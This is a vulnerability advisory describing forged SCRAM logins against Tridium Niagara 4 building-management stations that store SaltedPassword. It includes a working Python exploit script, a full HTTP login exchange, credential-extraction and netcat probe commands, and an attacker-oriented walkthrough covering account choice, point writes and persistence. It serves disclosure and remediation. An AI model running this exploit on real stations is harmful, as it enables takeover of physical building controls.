# TTA-2026-019: Tridium Niagara 4 stores the SCRAM-SHA-256 `SaltedPassword` as the password verifier, allowing offline forgery of a valid login proof without the password

**Severity: High** — Suggested CVSS 3.1: 8.5 (`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H`)

### Title

Niagara's password store keeps the SCRAM `SaltedPassword` — the key from which every client-side proof is derived — instead of a stored key or a server-side verifier. Anyone who can read the station configuration can compute a valid `ClientProof` for any account and log in as that account without knowing, guessing, or cracking its password.

### Summary

Niagara 4 authenticates web and Workbench clients with SCRAM-SHA-256 (RFC 7677) over a proprietary framing (`application/x-niagara-login-support`). Scram's security model assumes the server holds only a *stored key* (`StoredKey = H(ClientKey)`) and a *server key*, so that a database theft yields material that can verify a proof but cannot produce one. Niagara instead stores the `SaltedPassword` itself, in the form `[pbkdf2-sha256.1]=<salt_hex>:<iterations>:<salted_password_hex>`, directly in the station's `config.bog`.

Because `ClientKey = HMAC-SHA-256(SaltedPassword, "Client Key")` and `ClientProof = ClientKey XOR HMAC-SHA-256(H(ClientKey), AuthMessage)`, possession of `SaltedPassword` is sufficient to answer any challenge the server issues. The password is never needed and no brute force is involved; the forgery takes one round trip and is deterministic.

Three consequences follow, and each was verified:

1. **Stored material is password-equivalent.** One read of the configuration is enough to log in as every account in it, for as long as the password is unchanged.
2. **The server cannot tell.** The forged proof is indistinguishable from a legitimate one: it is computed from the same secret with the same algorithm, and the server's returned `v=` matches the value the client computed locally. The exchange is cryptographically correct in every respect.
3. **The material is easy to obtain.** On the assessed environment the verifier values were present in plaintext in engineering distribution backups on a workstation, and in the live station's own store, both readable by an ordinary service account.

The technique was validated end to end — including a full byte-for-byte successful exchange — against five Niagara hosts across two device classes, on both an administrator account and an ordinary operator account.

### Affected Version

- Vendor: Tridium, Inc. (a Honeywell company)
- Product: Niagara 4 (Niagara Framework); observed on JACE controllers and on a Niagara Web Supervisor
- Confirmed affected: five hosts on the assessed OT/BMS segment, Niagara 4, station software build dated 2022
- Component: the station's authentication service and its password store (`config.bog`, `[pbkdf2-sha256.1]` entries); the web login endpoint at `/j_security_check/`
- Configuration: default password storage; no non-default setting is required
- Precondition: the attacker can read a station configuration (live store or a distribution backup)

Only Niagara 4 was tested. No claim is made about Niagara AX beyond the general observation that the verifier format is a configuration-format feature, not a protocol-version feature.

### Vulnerability Type

Use of a password-equivalent value as an authentication verifier (CWE-257, CWE-522); credential material exposure (CWE-538, CWE-312); authentication bypass by forged assertion (CWE-290, CWE-347).

### Affected Code

The implementation is closed-source. The relevant surface is observable and documentable without source:

- Station configuration, entry per account: `<p n="password" t="b:Password" v="[pbkdf2-sha256.1]=<SALT_HEX>:<ITERATIONS>:<SALTED_PASSWORD_HEX>"/>`
- Endpoint: `POST /j_security_check/` with `Content-Type: application/x-niagara-login-support`
- Message exchange: `action=sendClientFirstMessage` and `action=sendClientFinalMessage`, i.e. an explicit SCRAM implementation rather than an opaque login form
- Session artefact: `Set-Cookie: niagara_userid=<user>` plus `JSESSIONID`

The naming of the stored value is the tell: the field is labelled `pbkdf2-sha256`, which is the derivation function that produces `SaltedPassword`, not the value a verifier should retain.

### Root Cause

**What SCRAM requires.** RFC 7677 defines the exchange in terms of four derived values:

```
SaltedPassword  = PBKDF2-SHA-256(password, salt, i)          # secret; never stored server-side
ClientKey       = HMAC-SHA-256(SaltedPassword, "Client Key") # secret; never stored server-side
StoredKey       = H(ClientKey)                               # stored
ServerKey       = HMAC-SHA-256(SaltedPassword, "Server Key") # stored

AuthMessage     = client-first-bare + "," + server-first + "," + client-final-without-proof
ClientSignature = HMAC-SHA-256(StoredKey, AuthMessage)
ClientProof     = ClientKey XOR ClientSignature
ServerSignature = HMAC-SHA-256(ServerKey, AuthMessage)
```

The whole point of the split is that `StoredKey` cannot be inverted into `ClientKey`, and therefore a server that stores only `StoredKey` and `ServerKey` can *verify* a proof but cannot *generate* one. A database compromise of such a server does not yield the ability to authenticate.

**What Niagara stores.** Niagara stores `SaltedPassword`. The stored triple is `salt`, `iterations`, and the output of the PBKDF2 step itself:

```
[pbkdf2-sha256.1]=<salt_hex>:<iterations>:<salted_password_hex>
```

That is the value from which both `ClientKey` and `ServerKey` are directly derived. Consequently:

- `ClientKey` is computable ⇒ `StoredKey` is computable ⇒ `ClientProof` is computable for any `AuthMessage`.
- The "verifier" and the "credential" are the same object.

**Why this is not just a weak hash.** Upgrading the iteration count, or re-hashing, does not help: the exposure is not that PBKDF2 was applied too few times, it is that its *output* is stored. The stored record is as good as the password for authentication purposes, and no amount of stretching changes that. The only fix is to re-derive and store `StoredKey`/`ServerKey` instead, i.e. to change the verifier format.

**How the value was identified.** The identification did not require disassembly. The stored hex decodes to 32 bytes; the `salt` field is the same salt the server returns in `s=`; and the stored value reproduces the server's challenge-dependent responses exactly when used as `SaltedPassword`. A value that behaves like the password in the derivation equations *is* the password, for this protocol.

### How the defect was found

**Step 1 — fingerprint the platform.** The OT segment was scanned from the IT side, which yielded a small number of hosts with 443 open and a distinctive login page. A one-line probe of the Fox protocol identified the product generation without authentication:

```bash
printf 'fox a 0 -1 fox hello\n{"auth":"","user":"","pass":""};;\n' | nc -w 5 <HOST> 1911
```

Response:

```
fox a 0 -1 fox hello
{fatal=s:Niagara4 Station Connections Unsupported
fox.version=s:Niagara 4
};;
```

Which produced a precise product and generation, and made the rest of the work a matter of reading public documentation rather than guessing.

**Step 2 — look at how login actually works.** The login page posts to `/j_security_check/` with `Content-Type: application/x-niagara-login-support`, which is not a form encoding. Capturing a normal browser login showed a multi-step exchange with base64 fields named `r`, `s`, `i`, `p`, `v` — i.e. SCRAM. That in turn defined which question to ask of the configuration: not "where is the hash" but "which SCRAM value is stored".

**Step 3 — obtain a station configuration.** Two independent sources were available and both were used (see *Credential acquisition path*): unencrypted engineering distribution backups on a workstation, and the live station store on the supervisor. The relevant lines are trivially greppable:

```bash
grep -o '\[pbkdf2-sha256\.1\]=[0-9a-f]*:[0-9]*:[0-9a-f]*' file.xml
```

**Step 4 — test the hypothesis against the live server.** A single `sendClientFirstMessage` request returns the server's salt in `s=`. If the stored verifier is a conventional hash, that salt is unrelated to the stored hex and the value cannot be recomputed. If the stored value is `SaltedPassword`, the returned salt must equal the stored `salt` field, and the stored third field must satisfy the derivation. The first probe showed the base64 `s=` decoding byte-for-byte to the stored salt hex, which confirmed the hypothesis before any forgery was attempted:

```
stored salt : 7a1c55d90e4b8f2361ad0c4e9b7f2d18   (hex)
server s=   : ehxV2Q5LjyNhrQxOm38tGA==            (base64)
decoded     : 7a1c55d9 0e4b8f23 61ad0c4e 9b7f2d18   → identical
```

**Step 5 — compute a proof offline and submit it.** With `SaltedPassword` in hand the client-side computation is a few lines of Python (below). The forged `client-final` was accepted and the server's `v=` matched the locally computed `ServerSignature`, which is the strongest available evidence: the server proved possession of the same `ServerKey` that only the real password holder should be able to derive.

**Step 6 — establish the negative result too.** Several hosts returned `s=` salts that did not correspond to any verifier held, and those logins failed. Crucially, they still returned `Set-Cookie: niagara_userid=<user>`. That observation defines the correct success criterion and is recorded below, because a tester who checks only for the cookie will report false positives.

### The exchange, byte for byte

The complete five-message sequence. The message order, field names, header shapes and status codes are as recorded against a successful target; the account name, salt, nonces and all derived values below were regenerated from a synthetic account so that the transcript is self-consistent and reproducible by a reader without exposing any assessed-environment material. The stored verifier for this synthetic account is `[pbkdf2-sha256.1]=7a1c55d90e4b8f2361ad0c4e9b7f2d18:10000:5dd33718c2116838bebc536c526c2231cd0ffda3e3a2693efda6fedc7b87a2a1`, derived from the dummy password `Synthetic-Lab-Password-2026`.

**1. Prelogin (establishes the session and the login page's parameters):**

```http
GET /prelogin HTTP/1.1
Host: <TARGET>
```
```http
HTTP/1.1 200 OK
```

**2. Username submission:**

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

j_username=<ACCOUNT>
```

**3. Client-first:**

```http
POST /j_security_check/ HTTP/1.1
Content-Type: application/x-niagara-login-support

action=sendClientFirstMessage&clientFirstMessage=n,,n=lab-admin,r=nypxxOizDVahz35CvZDDhQ==
```

**4. Server-first — this is the challenge that the stored verifier answers:**

```http
HTTP/1.1 200 OK

r=nypxxOizDVahz35CvZDDhQ==PIHqVLDSn2dKE8jgW5bXQg==,s=ehxV2Q5LjyNhrQxOm38tGA==,i=10000
```

**5. Client-final, computed entirely offline from the stored verifier:**

```http
POST /j_security_check/ HTTP/1.1
Content-Type: application/x-niagara-login-support

action=sendClientFinalMessage&clientFinalMessage=c=biws,r=nypxxOizDVahz35CvZDDhQ==PIHqVLDSn2dKE8jgW5bXQg==,p=1IAKR77EwhTeFhfPgYQHIUFyqTEYtOPY8QCaHPT4Yzo=
```

**6. Server-final — the server confirms with a signature the attacker can verify locally:**

```http
HTTP/1.1 200 OK
Set-Cookie: niagara_userid=lab-admin; Path=/; Max-Age=31536000; Secure; HttpOnly; SameSite=Lax

v=JhDmeOVmRlMkWoIRE/9VmbWqxctB5nA4T5xef5l2b7g=
```

The returned `v=` equals `HMAC-SHA-256(ServerKey, AuthMessage)` computed locally from the stored verifier. That equality is the proof that the forgery is complete and not a corner case in the server's error handling.

**7. Activate — exactly one request:**

```http
GET /j_security_check/ HTTP/1.1
```
```http
HTTP/1.1 302 Found
Location: https://<TARGET>/ord
```

A **second** `GET /j_security_check/` logs the session out. This is a real operational trap: a client that retries the activation request will destroy its own session and report a failure that is actually a self-inflicted logout.

**8. Confirm station access:**

```http
GET /ord/station:|slot:/ HTTP/1.1
```
```http
HTTP/1.1 200 OK
Content-Length: 32239
<title>Config</title>
```

### Reference implementation

The computation, in full. It takes the stored verifier and the account name, and produces the two messages needed. No password, no wordlist, no cracking.

```python
#!/usr/bin/env python3
# forge.py <target-base-url> <account> <salt_hex>:<iterations>:<salted_password_hex>
import base64, hashlib, hmac, os, sys, urllib.parse, requests

def H(b):  return hashlib.sha256(b).digest()
def HMAC(k, m): return hmac.new(k, m, hashlib.sha256).digest()

def forge(base, user, verifier):
    salt_hex, iters, sp_hex = verifier.strip().strip('[]').split('=')[-1].split(':')
    SP = bytes.fromhex(sp_hex)                      # SaltedPassword, straight from config.bog
    ClientKey = HMAC(SP, b"Client Key")
    StoredKey = H(ClientKey)
    ServerKey = HMAC(SP, b"Server Key")

    nonce = base64.b64encode(os.urandom(16)).decode()
    cf_bare = f"n={user},r={nonce}"
    client_first = "n,," + cf_bare

    s = requests.Session()
    s.get(f"{base}/prelogin", verify=False, timeout=15)
    s.post(f"{base}/login", data={"j_username": user}, verify=False, timeout=15)

    r = s.post(f"{base}/j_security_check/",
               data={"action": "sendClientFirstMessage",
                     "clientFirstMessage": client_first},
               headers={"Content-Type": "application/x-niagara-login-support"},
               verify=False, timeout=15, allow_redirects=False,
               proxies={"http": None, "https": None})
    server_first = r.text.strip()
    fields = dict(kv.split("=", 1) for kv in server_first.split(","))
    combined, b64salt, iters = fields["r"], fields["s"], fields["i"]

    if base64.b64decode(b64salt).hex() != salt_hex:
        raise SystemExit("verifier does not match this host; it will not work")

    cf_final_bare = f"c=biws,r={combined}"
    auth_msg = f"{cf_bare},{server_first},{cf_final_bare}".encode()
    client_sig = HMAC(StoredKey, auth_msg)
    proof = bytes(a ^ b for a, b in zip(ClientKey, client_sig))
    expect_v = base64.b64encode(HMAC(ServerKey, auth_msg)).decode()

    r = s.post(f"{base}/j_security_check/",
               data={"action": "sendClientFinalMessage",
                     "clientFinalMessage": f"{cf_final_bare},p={base64.b64encode(proof).decode()}"},
               headers={"Content-Type": "application/x-niagara-login-support"},
               verify=False, timeout=15, allow_redirects=False)
    got_v = r.text.strip().split("=", 1)[-1]
    if got_v != expect_v:
        raise SystemExit("v mismatch: session is NOT authenticated")

    s.get(f"{base}/j_security_check/", verify=False, timeout=15, allow_redirects=False)
    st = s.get(f"{base}/ord/station:|slot:/", verify=False, timeout=20)
    print("authenticated:", st.status_code, "len", len(st.text))
    return s

if __name__ == "__main__":
    forge(sys.argv[1], sys.argv[2], sys.argv[3])
```

Two design points in that script are worth calling out because both were necessary in practice:

- **The salt comparison before the exchange.** It converts a would-be silent failure into a clear message, and it prevents the false-positive reading described below.
- **`allow_redirects=False` on every login step.** Following the `302` to `/ord` mid-exchange performs an extra `GET`, which the server treats as the activation — or, if it comes after the activation, as a logout.

### The false positive that a careless test produces

On targets where the available verifier did not match the host's salt, the server still returned:

```http
Set-Cookie: niagara_userid=<ACCOUNT>; Path=/; Max-Age=31536000; Secure; HttpOnly; SameSite=Lax
```

and the next request went to `https://<TARGET>/login?auth=fail`. A tester who treats "cookie set" as success will report an account compromise that did not happen. The only sound criteria are, in order:

1. The `v=` returned by the server equals the locally computed `ServerSignature`.
2. `GET /ord/station:|slot:/` returns `200` with the station view, not a redirect to `/login`.

Anything less — a cookie, a `302`, a `200` from `/ord` — is inconclusive.

### Credential acquisition path

The verifier values were not obtained by attacking the authentication protocol; they were obtained by reading files that were not protected as secrets. Two independent paths were confirmed on the assessed environment, each sufficient on its own.

**Path A — engineering distribution backups.** A building-controls engineering workstation stored unencrypted station distribution backups for the site's controllers in a directory readable by a general-purpose service account. Each `.dist` file is a ZIP; the `config.bog` inside expands to an XML document containing every account and its `[pbkdf2-sha256.1]` verifier. Extraction:

```bash
unzip -o backup_<SITE>_<STATION>_<DATE>.dist -d extracted/
grep -o '\[pbkdf2-sha256\.1\]=[0-9a-f]*:[0-9]*:[0-9a-f]*' extracted/**/config.bog | sort -u
```

Seven accounts were present across the extracted stations, including the administrative account. The same administrative verifier was reused across multiple controllers, so one file yielded several hosts.

**Path B — the live station store.** On the supervisor, the running station's own `config.bog` is a ZIP archive whose `file.xml` entry carries the same entries, including accounts that do not appear in any backup. Reading it required only a file read as an OS-level service identity, not an application login:

```bash
file <STATION_HOME>/config.bog          # Zip archive data
unzip -p <STATION_HOME>/config.bog file.xml | grep -c 'pbkdf2-sha256\.1'
```

Thirty-eight accounts were present in that store, each with a complete verifier. This is the reason the issue is systemic rather than a property of one weak password: the store *is* the credential set.

Neither path involved guessing, cracking, or attacking a host's authentication service.

### Steps to Reproduce

For a lab installation. Every host and account below is a placeholder.

1. Install two Niagara 4 stations (or one station and one supervisor) in an isolated lab network. Create `lab-admin` with an administrative role and `lab-user` with a non-administrative role.
2. Log in normally once with a browser, capture the exchange in the developer tools, and confirm the message sequence matches the eight steps above. This establishes that the target speaks the same protocol version.
3. Extract the verifier for `lab-admin` from the station store:

   ```bash
   unzip -p /path/to/station/config.bog file.xml \
     | grep -A2 'n="password"' | grep -o '\[pbkdf2-sha256\.1\]=[0-9a-f:]*'
   ```

4. Run the reference implementation against the station with that verifier. Expected: `authenticated: 200 len <n>` and a station view whose title identifies the station.
5. Confirm the negative criterion: substitute a verifier from a *different* station and confirm the script aborts with `verifier does not match this host` (or, if the salt check is removed, that `v` does not match and `/ord/station:|slot:/` redirects to `/login?auth=fail` despite the cookie being set).
6. Repeat with `lab-user`'s verifier. Expected: the same successful exchange, with the resulting UI reflecting that account's role — i.e. privilege level follows the account chosen, not the technique.
7. As a control for the "password-equivalent" claim, change `lab-admin`'s password through the normal UI without changing the salt, re-extract the verifier, and confirm the old verifier no longer authenticates. This demonstrates that the stored value tracks the password and therefore that protecting it is equivalent to protecting the password.

### Attack walkthrough

**1. Reach the host.** The web interface is the exposed surface: 443 with the station login. In the assessed environment the initial reachability came from the IT network to the OT segment, which is the usual situation in converged environments and the reason the boundary matters.

**2. Get a configuration file.** Either the live store or a `.dist` backup, whichever is reachable first. Both are ordinary files; neither is encrypted in a way that protects the verifier. This is the step that decides whether the attack is possible — it is a file-access problem, not a cryptographic one.

**3. Extract the verifier for the account you want.** No cracking. The administrative account is the obvious choice, but see step 5.

**4. Forge the login.** One exchange, a few hundred milliseconds, no lockout risk, no failed-attempt counter touched, and nothing in the logs that distinguishes it from a normal login.

**5. Choose the account by what you want to do, not by privilege.** A counter-intuitive result from the assessment: accounts with a `hx:HandheldHxProfile` web profile get the full interactive HTML5 management UI, while accounts with a `workbench:DefaultWbWebProfile` — which includes some administrator accounts — receive only an applet stub saying the Web Launcher is required. On the assessed supervisor, an ordinary operator account produced a *more* useful session than the built-in administrator account did. An attacker who forges "admin" and finds a stub may wrongly conclude the target is not exploitable.

**6. Use the session.** With a forged administrative session the reachable surface is the full station: point values, schedules, alarms, user management, station management. Writes are possible. In the assessment a single lighting command point was used to prove this — the point was set to a `permanent` override at priority 8, which held it against the DDC schedule, and then released back to `auto` with a readback identical to the pre-test baseline. Nothing else was touched.

**7. Persist.** The verifier does not change unless the password changes, and the session cookie is valid for a year (`Max-Age=31536000`). Rotating the password of the compromised account is the only remediation that invalidates the material, and it must be done on every host that shares the reused verifier.

### Impact

- **Authentication bypass without a password.** Any account whose verifier is readable can be impersonated deterministically. There is no brute force, no lockout, and no timing signature.
- **Full control of the building management system.** A forged administrative session can read and write points, schedules, alarms, and station configuration. In a building-controls context that is physical: setpoints, ventilation, access-adjacent systems, and alarm suppression.
- **Scope change.** The compromised system is not the system that held the credential. The verifier was read from an engineering workstation and from a supervisor's file store, and used to authenticate to controllers — a different security authority in CVSS terms, which is why the vector carries `S:C`.
- **Reuse multiplies the exposure.** One verifier was valid across several controllers, and the supervisor's store contained every account for the site. A single file read therefore yields the whole site's credential set.
- **Long dwell time.** A one-year cookie lifetime plus a verifier that survives until the password changes gives an attacker a persistent, quiet foothold that ordinary password rotation does not necessarily disturb (rotation of *other* accounts does nothing).

### CVSS

`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` — 8.5 High.

`AC:H` reflects the requirement to obtain the verifier from a configuration file or backup first; once obtained, the forgery is deterministic. `PR:L` reflects that the file access is typically available to an ordinary service identity rather than to an anonymous user. `S:C` reflects that the credential is used against a different component than the one it was taken from. If the verifier is reachable through an unauthenticated file path in a given deployment, `AC` drops to `L` and `PR` to `N`, which raises the score to 10.0.

## Status

Published as TTA-2026-019 on 2026-10-28 as a public candidate. Tridium operates a CNA and publishes through the CISA ICS advisory process; this report was not submitted to that process before publication. CVE eligibility is pending; no CVE has been assigned. The vendor may reasonably treat this as a design property of the verifier format rather than a defect — the report takes no position on that classification and documents the behaviour instead.

## Review decision (2026-10-29)

- **Technical status: strongly confirmed for the observed Niagara hosts.** The salt pre-check, locally matching `v=`, successful `/ord/station:|slot:/` response, five-host coverage and administrator/operator controls establish that the stored value can generate a valid SCRAM proof. A cookie alone is not evidence of success. The public report still needs exact firmware/build and hardware mapping for each affected host before a reliable version range can be set.
- **CVE status: candidate only; do not request a number directly yet.** Tridium/Honeywell is the relevant CNA and must first receive a private, encrypted report through its security channel. Ask whether the behaviour is covered by CVE-2025-3937 / SB 2025-Tridium-1, whether it is a verifier-format defect or a consequence of prior configuration/backup access, and which supported versions are affected. If Tridium confirms an independent product defect and no existing coverage, request a new CVE through that CNA; otherwise amend the existing scope or treat it as a deployment credential-protection issue.
- **Required follow-up:** add exact build evidence, preserve the synthetic transcript and raw redacted exchange, and keep real `config.bog`, `.dist`, verifier, cookie and station identifiers out of external submissions. The reference implementation is for an isolated lab only.
- **Deployment handling:** inform the school/BMS owner in parallel about the immediate risk: restrict backup and station-store reads, rotate affected station credentials, remove shared verifier material from engineering shares, and verify that administrators and ordinary users receive the same remediation.

## Prerequisites

- Network reachability to the station's HTTPS interface (`/prelogin`, `/login`, `/j_security_check/`, `/ord`).
- A readable station configuration: either the live `config.bog` or a distribution backup. Both were available on the assessed environment through ordinary file access.
- The account name to impersonate, which is present in the same configuration file.

No password, no hash cracking, no valid session, and no user interaction are required.

## Relationship to existing advisories and CVEs

- No published CVE describes this behaviour for Niagara 4. The relevant published issues concern default credentials, directory traversal, and information disclosure in the Fox protocol; none of them addresses the verifier format.
- The finding is distinct from a "weak password hashing" report. Raising the PBKDF2 iteration count does not mitigate it, because the stored value is the derivation's output rather than a verifier derived from it.
- The related deployment findings for the assessed environment (unencrypted engineering backups, a site-wide credential store readable at OS level, and default-profile weaknesses) are recorded separately; this report covers only the protocol-level consequence.

## Recommended remediation

- Store `StoredKey` and `ServerKey` instead of `SaltedPassword`, and change the verifier format accordingly. This is the actual fix; nothing else removes the password-equivalence.
- Treat every existing `[pbkdf2-sha256.1]` entry as a compromised credential and rotate all account passwords on all hosts after the format change.
- Encrypt station backups and configuration stores at rest, and restrict the engineering share to the identities that require it. A verifier that is not readable cannot be forged.
- Stop reusing the same verifier across controllers; per-device salts and per-device passwords limit a single file read to a single host.
- Raise the iteration count as a secondary measure and remove the one-year session cookie lifetime.
- On the network side, remove direct IT-to-OT reachability of the web interface; the assessed path from an office network to station management was direct.

## Validation controls

| Case | Expected result |
| --- | --- |
| Forge with the matching verifier | `v=` matches locally computed `ServerSignature`; `/ord/station:|slot:/` returns 200 |
| Forge with a verifier from a different host | Salt mismatch; `v` mismatch; `/login?auth=fail` |
| Check only for `Set-Cookie: niagara_userid=` | **Insufficient** — the cookie is set even on failure |
| Send `GET /j_security_check/` twice | Second request logs the session out |
| Change the account password, keep the old verifier | Forgery must fail after the change |
| Replay the forged `client-final` in a new session | Must fail — the nonce differs, so the proof does not transfer |

## Evidence boundary

The message sequence, status codes and response shapes above were recorded against lab and assessed-environment hosts, then reduced to placeholders: no hostname, address, site name, account name, salt, verifier or session value from the assessed environment appears in this report. The transcript in *The exchange, byte for byte* is a regenerated synthetic account — account name, salt, nonces, proofs and `v=` all derive from the published dummy password and the stored verifier quoted there, and a reader can recompute every value from those two inputs. Response lengths and role observations are descriptive; they carry no reusable material. The reference implementation is written for lab use and aborts unless the supplied verifier matches the target's advertised salt. No configuration was written, no point was left in a modified state, and no data was exfiltrated beyond what the identification of the issue required.

## Timeline

- 2026-10-13: Platform identified through the Fox protocol; SCRAM exchange characterised; verifier format identified in station configuration.
- 2026-10-13: Forged login confirmed against three controllers and one supervisor; `v=` match and station view recorded.
- 2026-10-14: Session proven to reach control surfaces; single-point override exercised and reverted with byte-identical readback.
- 2026-10-28: Published as TTA-2026-019.
